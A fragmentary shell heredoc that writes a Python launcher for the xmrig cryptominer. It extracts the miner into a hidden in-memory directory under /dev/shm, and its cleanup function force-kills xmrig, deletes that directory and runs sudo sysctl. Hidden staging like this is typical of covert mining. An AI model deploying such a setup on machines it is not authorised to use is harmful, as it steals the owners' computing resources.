cd ~/munna && cat > munna.py << 'FIXED'
#!/usr/bin/env python3
import os,subprocess as s,sys,signal,atexit,urllib.request,tarfile
...
R=Path("/dev/shm/.m")
def c():s.run("pkill -9 xmrig 2>/dev/null",shell=True);s.run(f"rm -rf {R} 2>/dev/null",shell=True);s.run("sudo sysctl -w vm.nr_hugepages=0 2>/dev/null",shell=True);sys.exit(0)
...
print("Extracting...")
with tarfile.open(t) as f:f.extractall(R)
t.unlink()
